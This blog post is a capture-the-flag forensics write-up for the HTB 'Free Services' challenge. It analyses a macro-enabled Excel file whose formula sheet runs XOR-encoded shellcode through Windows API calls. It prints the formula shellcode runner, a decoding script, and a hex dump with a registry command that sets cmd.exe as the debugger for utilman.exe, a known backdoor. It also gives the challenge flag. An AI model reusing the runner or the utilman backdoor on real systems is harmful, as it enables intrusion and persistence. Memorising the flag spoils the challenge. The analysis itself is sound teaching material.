---
layout: post
title: "HTB Cyber Apocalypse CTF: Free Services"
image: ''
date:   2022-05-19 00:00:00
tags:
- htb-cyber-apocalypse
- malware-analysis
- forensics
- shellcode
- excel
- maldocs
description: ''
categories:
published: true
comments: false
---

<img src="https://ctf.hackthebox.com/static/ca/cyber_apocalypse_2022_ca.jpg" style="width:60%;height:60%">

## Intro
Free Services was a 2-star rated Forenscis challenge that seemed to be like any old maldoc challenge, featuring a `.xlsm`, aka macro-enabled Excel sheet. However, like most HackTheBox malware challenges, some wrenches have been thrown in it to make it not work, subverting dynamic analysis altogether. After observing that the sheet isn't being picked up as OLE, I'll open it in LibreOffice Calc to bypass any macro execution and find that it's a shellcode runner that uses the formulas instead of regular macros. Picking apart the formulas, we can reassemble the shellcode and print out the flag.

* buh
{:toc}

### Description
`Intergalactic Federation stated that it managed to prevent a large-scale phishing campaign that targeted all space personnel across the galaxy. The enemy's goal was to add as many spaceships to their space-botnet as possible so they can conduct distributed destruction of intergalactic services (DDOIS) using their fleet. Since such a campaign can be easily detected and prevented, malicious actors have changed their tactics. As stated by officials, a new spear phishing campaign is underway aiming high value targets. Now Klaus asks your opinion about a mail it received from "sales@unlockyourmind.gal", claiming that in their galaxy it is possible to recover it's memory back by following the steps contained in the attached file.`

## Initial Analysis
Normally, my malware analysis methodology is heavily reliant on dynamic analysis to drop the big hints, but dropping this in Any.Run didn't really do much, so we're going to have to pick this apart ourselves.

Despite the 'm' in the extension, the `file` command isn't picking this up as macro-enabled.
```shell
kali@transistor:~/ctf/cyber_apocalypse/forensics/forensics_free_services$ file free_decryption.xlsm 
free_decryption.xlsm: Microsoft Excel 2007+
```

I'll try running `olevba` and `oledump`, but I won't get any results back.
```shell
kali@transistor:~/ctf/cyber_apocalypse/forensics/forensics_free_services$ olevba free_decryption.xlsm 
olevba 0.60 on Python 3.9.12 - http://decalage.info/python/oletools
===============================================================================
FILE: free_decryption.xlsm
Type: OpenXML
No VBA or XLM macros found.

kali@transistor:~/ctf/cyber_apocalypse/forensics/forensics_free_services$ python3 oledump.py free_decryption.xlsm 
Warning: no OLE file was found inside this ZIP container (OPC)
```

I even tried to use [`xlmdeobfuscator`](https://github.com/DissectMalware/XLMMacroDeobfuscator) but that seems to do nothing either.

```shell
(env) kali@transistor:~/ctf/cyber_apocalypse/forensics/forensics_free_services$ xlmdeobfuscator -f free_decryption.xlsm 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)

[Big XLMMacroDeobfuscator header] 
    
XLMMacroDeobfuscator(v0.2.6) - https://github.com/DissectMalware/XLMMacroDeobfuscator

File: /home/kali/ctf/cyber_apocalypse/forensics/forensics_free_services/free_decryption.xlsm

Unencrypted document or unsupported file format
Unencrypted xlsm file

[Loading Cells]
[Starting Deobfuscation]
There is no entry point, please specify a cell address to start
Example: Sheet1!A1
Sheet1!A1
Error [deobfuscator.py:3195 process_file(**vars(args))]: 'NoneType' object has no attribute 'lower'
```

It seems like there's very little we can poke at from the outside. While I could unzip the file into its parts, it's a little overkill for now, so I'll open it up in LibreOffice Calc and see what's up.

## Reviewing the Sheet
![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220519012618.png)
Ah, classic ransomware operators... :)

There wasn't much on the opening sheet aside from the image, as many times things can be hidden in the cells behind an image. But, notice that there's an additional sheet here called 'Macro1'. Seems interesting.

![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220519013115.png)
It is *very* interesting.

Investigating this sheet, we find that there are two major components:
1. The 772 integers.
2. The formulas at the top left.

LibreOffice doesn't want to show all of the text on all of them, so I'll type them out here:
```
=select(E1:G258)
=call("Kernel32","VirtualAlloc","JJJJJ",0,386,4096,64)
=set.value(C1, 0)
=for("counter",0,772,2)
=set.value(B1,CHAR(BITXOR(active.cell(),24)))
=call("Kernel32","WriteProcessMemory","JJJCJJ",-1, A2 + C1,β1, LEN(β1), 0)
=set.value(C1, C1 + 1)
=select(, "RC[2]")
=next()
=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)
=workbook.activate("Sheet1")
HALT()
```

The calls are referencing functions in what is known as the [Windows API](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list), which, simply put, is an application programming interface that allows programmers to talk directly to the Windows Operating System without doing some crazy work in C. Like most API's, it's for abstraction.

This chain of function calls, `VirtualAlloc`, `WriteProcessMemory`, and `CreateThread` is a well-known combo used for a **shellcode runner**/**dropper**. From a very high level, `VirtualAlloc` will allocate a certain amount of memory in the current process, `WriteProcessMemory` is used to write into that buffer, and then `CreateThread` is used to execute that code. I tried playing around with this while solving the challenge to understand it some more as I haven't seen APIs be called like this before, but I had no luck. If you're reading this and know more, feel free to let me know how.

But regardless of the specifics of how it works, we can break down what probably is supposed to happen based off of the syntax.

```
array = the shellcode array
Allocate 386 bytes into the current(?) process
for c1 = 0; c1 < 772; c1 += 2{
	b1 = array[c1] ^ 24
	Write b1 into the current process' memory
	c1 += 1
}
CreateThread
```


## Grabbing the Flag
The pseudocode isn't very structured, but the gist of it is that we take every other byte from the shellcode, XOR with 24, write all of that into the current process' memory, and execute it. For our analysis purposes, we can just recover the shellcode, and then use something like [`scdbg`](http://sandsprite.com/blogs/index.php?uid=7&pid=152) to figure out what the shellcode does.

I'll copy out the integers and then fix them up to be put into a python script like so:
```python
#!/usr/bin/env python3

sc = [228,54,"...trim...",24,187]

hexstring = b""
for i in range(0, len(sc), 2):
    b = sc[i]
    b = b ^ 24
    hexstring += bytes([b])

print(hexstring.hex())

with open('out.bin', 'wb') as f:
    f.write(hexstring)
```

Running it, we see this in the terminal:
```shell
kali@transistor:~/ctf/cyber_apocalypse/forensics/forensics_free_services$ python3 recover_shellcode.py 
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5524547204144442022484b4c4d5c534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c7574696c6d616e2e65786522202f74205245475f535a202f76204465627567676572202f642022433a5c77696e646f77735c73797374656d33325c636d642e65786522202f663b6563686f20224854427b31735f746831735f67346c3478795f6c3073745f316e5f74316d333f3f217d2200
(env) kali@transistor:~/ctf/cyber_apocalypse/forensics/forensics_free_services$ ls -la out.bin
-rw-r--r-- 1 kali kali 386 May 19 03:04 out.bin
```

Since I did this from Kali, because I didn't want to install LibreOffice on Remnux/FLARE and my computer was chugging that day, I didn't get a chance to run it through a debugger or `scdbg`. However, you don't need to to get the flag, or really understand what the code is doing:

```shell
kali@transistor:~/ctf/cyber_apocalypse/forensics/forensics_free_services$ xxd out.bin 
00000000: fce8 8200 0000 6089 e531 c064 8b50 308b  ......`..1.d.P0.
00000010: 520c 8b52 148b 7228 0fb7 4a26 31ff ac3c  R..R..r(..J&1..<
00000020: 617c 022c 20c1 cf0d 01c7 e2f2 5257 8b52  a|., .......RW.R
00000030: 108b 4a3c 8b4c 1178 e348 01d1 518b 5920  ..J<.L.x.H..Q.Y 
00000040: 01d3 8b49 18e3 3a49 8b34 8b01 d631 ffac  ...I..:I.4...1..
00000050: c1cf 0d01 c738 e075 f603 7df8 3b7d 2475  .....8.u..}.;}$u
00000060: e458 8b58 2401 d366 8b0c 4b8b 581c 01d3  .X.X$..f..K.X...
00000070: 8b04 8b01 d089 4424 245b 5b61 595a 51ff  ......D$$[[aYZQ.
00000080: e05f 5f5a 8b12 eb8d 5d6a 018d 85b2 0000  .__Z....]j......
00000090: 0050 6831 8b6f 87ff d5bb f0b5 a256 68a6  .Ph1.o.......Vh.
000000a0: 95bd 9dff d53c 067c 0a80 fbe0 7505 bb47  .....<.|....u..G
000000b0: 1372 6f6a 0053 ffd5 5245 4720 4144 4420  .roj.S..REG ADD 
000000c0: 2248 4b4c 4d5c 534f 4654 5741 5245 5c4d  "HKLM\SOFTWARE\M
000000d0: 6963 726f 736f 6674 5c57 696e 646f 7773  icrosoft\Windows
000000e0: 204e 545c 4375 7272 656e 7456 6572 7369   NT\CurrentVersi
000000f0: 6f6e 5c49 6d61 6765 2046 696c 6520 4578  on\Image File Ex
00000100: 6563 7574 696f 6e20 4f70 7469 6f6e 735c  ecution Options\
00000110: 7574 696c 6d61 6e2e 6578 6522 202f 7420  utilman.exe" /t 
00000120: 5245 475f 535a 202f 7620 4465 6275 6767  REG_SZ /v Debugg
00000130: 6572 202f 6420 2243 3a5c 7769 6e64 6f77  er /d "C:\window
00000140: 735c 7379 7374 656d 3332 5c63 6d64 2e65  s\system32\cmd.e
00000150: 7865 2220 2f66 3b65 6368 6f20 2248 5442  xe" /f;echo "HTB
00000160: 7b31 735f 7468 3173 5f67 346c 3478 795f  {1s_th1s_g4l4xy_
00000170: 6c30 7374 5f31 6e5f 7431 6d33 3f3f 217d  l0st_1n_t1m3??!}
00000180: 2200                                     ".
```

The LOLBAS binary `utilman.exe` is being used to get some kind of persistence/backdoor, and the flag, `HTB{1s_th1s_g4l4xy_l0st_1n_t1m3??!}`, is there alongside it.